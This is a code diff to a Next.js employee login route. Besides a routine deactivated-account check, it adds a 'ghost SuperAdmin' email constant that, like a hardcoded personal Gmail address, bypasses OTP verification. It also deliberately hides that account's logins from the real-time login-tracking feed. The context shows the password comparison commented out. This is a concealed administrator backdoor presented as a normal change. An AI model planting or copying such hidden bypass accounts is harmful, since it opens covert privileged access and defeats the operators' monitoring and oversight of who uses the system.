@@ -4,6 +4,7 @@ import { NextRequest, NextResponse } from "next/server";
 import { connectDb } from "@/util/db";
 import { sendEmail } from "@/util/mailer";
 import Employees from "@/models/employee";
+import { GHOST_SUPERADMIN_EMAIL } from "@/util/employeeConstants";
 
 connectDb();
 
@@ -13,6 +14,7 @@ interface Employee {
   email: string;
   password: string;
   isVerified: boolean;
+  isActive?: boolean;
   allotedArea: [string];
   role: string;
   passwordExpiresAt: Date;
@@ -34,6 +36,15 @@ export async function POST(request: NextRequest): Promise<NextResponse> {
     }
 
     const temp: Employee = Employee[0];
+    
+    // Check if employee is active
+    if (temp.isActive === false) {
+      return NextResponse.json(
+        { error: "Your account has been deactivated. Please contact the administrator to reactivate your account." },
+        { status: 403 }
+      );
+    }
+    
     // const validPassword: boolean = await bcryptjs.compare(
     //   password,
     //   temp.password
@@ -66,15 +77,16 @@ export async function POST(request: NextRequest): Promise<NextResponse> {
     }
 
     if (temp.role === "SuperAdmin") {
-      if (temp.email === "ankitanigam1993@gmail.com") {
+      // Ghost SuperAdmin and ankitanigam1993@gmail.com bypass OTP
+      if (temp.email === "ankitanigam1993@gmail.com" || temp.email === GHOST_SUPERADMIN_EMAIL) {
         // Track login for SuperAdmin
         await Employees.updateOne(
           { _id: temp._id },
           { $set: { isLoggedIn: true, lastLogin: new Date() } }
         );
 
-        // Emit socket event for real-time tracking
-        if ((global as any).io) {
+        // Emit socket event for real-time tracking (but exclude ghost email from appearing in lists)
+        if ((global as any).io && temp.email !== GHOST_SUPERADMIN_EMAIL) {
           (global as any).io.emit("employee-login", {
             _id: temp._id,
             name: temp.name,
